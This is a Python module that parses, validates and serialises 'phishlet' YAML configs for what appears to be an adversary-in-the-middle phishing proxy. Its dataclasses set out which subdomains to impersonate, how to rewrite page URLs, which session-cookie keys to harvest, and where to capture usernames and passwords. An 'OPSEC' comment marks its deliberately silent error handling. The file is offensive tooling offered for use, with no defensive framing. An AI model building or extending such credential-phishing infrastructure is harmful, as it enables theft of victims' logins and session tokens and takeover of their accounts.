"""
Phishlet Parser and Manager
Source: plan-aligned-implementation-protocol.md Lines 149-294
OPSEC: Silent failure on parse errors
"""

import yaml
from pathlib import Path
from typing import Dict, List, Optional
from dataclasses import dataclass, field


@dataclass
class ProxyHost:
    """Proxy host configuration"""
    phish_sub: str
    orig_sub: str
    domain: str
    session: bool = True
    is_landing: bool = False


@dataclass
class SubFilter:
    """URL rewriting filter"""
    triggers_on: str
    orig_sub: str
    domain: str
    search: str
    replace: str
    mimes: List[str] = field(default_factory=lambda: ['text/html'])


@dataclass
class AuthToken:
    """Authentication token configuration"""
    domain: str
    keys: List[str]


@dataclass 
class Credential:
    """Credential capture configuration"""
    key: str
    search: str
    type: str = 'post'


@dataclass
class ForcePost:
    """Force POST capture configuration"""
    path: str
    search: List[str]
    force: List[str]


@dataclass
class Phishlet:
    """
    Complete phishlet configuration
    Source: plan.md Section 3.1, Lines 66-107
    """
    name: str
    author: str
    min_ver: str
    proxy_hosts: List[ProxyHost]
    sub_filters: List[SubFilter]
    auth_tokens: List[AuthToken]
    credentials: Dict[str, Credential]
    login: Dict[str, str]
    force_post: Optional[List[ForcePost]] = None
    is_enabled: bool = False
    subdomain: str = ''


class PhishletParser:
    """
    Phishlet YAML parser with validation
    Source: plan.md Section 3.1
    """
    
    REQUIRED_FIELDS = ['name', 'proxy_hosts', 'auth_tokens', 'credentials', 'login']
    
    @classmethod
    def load(cls, filepath: str) -> Optional[Phishlet]:
        """
        Load and parse a single phishlet YAML file
        
        Args:
            filepath: Path to the YAML file
            
        Returns:
            Phishlet object if valid, None on error
        """
        try:
            path = Path(filepath)
            if not path.exists():
                return None
            
            with open(path, 'r') as f:
                data = yaml.safe_load(f)
            
            if not data:
                return None
            
            # Validate required fields
            cls._validate(data, filepath)
            
            # Parse proxy_hosts
            proxy_hosts = []
            for ph in data.get('proxy_hosts', []):
                proxy_hosts.append(ProxyHost(
                    phish_sub=ph.get('phish_sub', ''),
                    orig_sub=ph.get('orig_sub', ''),
                    domain=ph.get('domain', ''),
                    session=ph.get('session', True),
                    is_landing=ph.get('is_landing', False)
                ))
            
            # Parse sub_filters
            sub_filters = []
            for sf in data.get('sub_filters', []):
                sub_filters.append(SubFilter(
                    triggers_on=sf.get('triggers_on', ''),
                    orig_sub=sf.get('orig_sub', ''),
                    domain=sf.get('domain', ''),
                    search=sf.get('search', ''),
                    replace=sf.get('replace', ''),
                    mimes=sf.get('mimes', ['text/html'])
                ))
            
            # Parse auth_tokens
            auth_tokens = []
            for at in data.get('auth_tokens', []):
                auth_tokens.append(AuthToken(
                    domain=at.get('domain', ''),
                    keys=at.get('keys', [])
                ))
            
            # Parse credentials
            credentials = {}
            creds_data = data.get('credentials', {})
            for cred_name, cred_info in creds_data.items():
                credentials[cred_name] = Credential(
                    key=cred_info.get('key', ''),
                    search=cred_info.get('search', '(.*)'),
                    type=cred_info.get('type', 'post')
                )
            
            # Parse force_post (optional)
            force_post = None
            if 'force_post' in data:
                force_post = []
                for fp in data.get('force_post', []):
                    force_post.append(ForcePost(
                        path=fp.get('path', ''),
                        search=fp.get('search', []),
                        force=fp.get('force', [])
                    ))
            
            # Create phishlet
            return Phishlet(
                name=data.get('name', ''),
                author=data.get('author', ''),
                min_ver=data.get('min_ver', '1.0.0'),
                proxy_hosts=proxy_hosts,
                sub_filters=sub_filters,
                auth_tokens=auth_tokens,
                credentials=credentials,
                login=data.get('login', {}),
                force_post=force_post
            )
            
        except Exception:
            return None  # Silent failure per OPSEC
    
    @classmethod
    def _validate(cls, data: dict, filepath: str) -> None:
        """Validate required fields exist"""
        for field in cls.REQUIRED_FIELDS:
            if field not in data:
                raise ValueError(f"Missing required field '{field}'")
        
        # Validate proxy_hosts has at least one entry
        if not data['proxy_hosts']:
            raise ValueError("proxy_hosts cannot be empty")
        
        # Validate auth_tokens has at least one domain
        if not data['auth_tokens']:
            raise ValueError("auth_tokens cannot be empty")
        
        # Validate credentials has username and password
        if 'username' not in data['credentials']:
            raise ValueError("credentials.username required")
        if 'password' not in data['credentials']:
            raise ValueError("credentials.password required")
    
    @classmethod
    def load_all(cls, directory: str) -> Dict[str, Phishlet]:
        """
        Load all phishlets from a directory
        
        Args:
            directory: Path to directory containing YAML files
            
        Returns:
            Dictionary of phishlet name -> Phishlet object
        """
        phishlets = {}
        
        try:
            path = Path(directory)
            if not path.exists():
                return phishlets
            
            for yaml_file in path.glob('*.yaml'):
                phishlet = cls.load(str(yaml_file))
                if phishlet:
                    phishlets[phishlet.name] = phishlet
            
            # Also check .yml extension
            for yaml_file in path.glob('*.yml'):
                phishlet = cls.load(str(yaml_file))
                if phishlet:
                    phishlets[phishlet.name] = phishlet
                    
        except Exception:
            pass  # Silent failure
        
        return phishlets
    
    @classmethod
    def validate_file(cls, filepath: str) -> bool:
        """
        Validate a phishlet file without loading it
        
        Returns:
            True if valid, False otherwise
        """
        phishlet = cls.load(filepath)
        return phishlet is not None
    
    @classmethod
    def get_token_keys(cls, phishlet: Phishlet) -> List[str]:
        """Get all token keys from phishlet"""
        keys = []
        for auth_token in phishlet.auth_tokens:
            keys.extend(auth_token.keys)
        return keys
    
    @classmethod
    def to_yaml(cls, phishlet: Phishlet) -> str:
        """
        Serialize phishlet back to YAML
        
        Args:
            phishlet: Phishlet object
            
        Returns:
            YAML string
        """
        data = {
            'name': phishlet.name,
            'author': phishlet.author,
            'min_ver': phishlet.min_ver,
            'proxy_hosts': [
                {
                    'phish_sub': ph.phish_sub,
                    'orig_sub': ph.orig_sub,
                    'domain': ph.domain,
                    'session': ph.session,
                    'is_landing': ph.is_landing
                }
                for ph in phishlet.proxy_hosts
            ],
            'sub_filters': [
                {
                    'triggers_on': sf.triggers_on,
                    'orig_sub': sf.orig_sub,
                    'domain': sf.domain,
                    'search': sf.search,
                    'replace': sf.replace,
                    'mimes': sf.mimes
                }
                for sf in phishlet.sub_filters
            ],
            'auth_tokens': [
                {
                    'domain': at.domain,
                    'keys': at.keys
                }
                for at in phishlet.auth_tokens
            ],
            'credentials': {
                name: {
                    'key': cred.key,
                    'search': cred.search,
                    'type': cred.type
                }
                for name, cred in phishlet.credentials.items()
            },
            'login': phishlet.login
        }
        
        if phishlet.force_post:
            data['force_post'] = [
                {
                    'path': fp.path,
                    'search': fp.search,
                    'force': fp.force
                }
                for fp in phishlet.force_post
            ]
        
        return yaml.dump(data, default_flow_style=False)

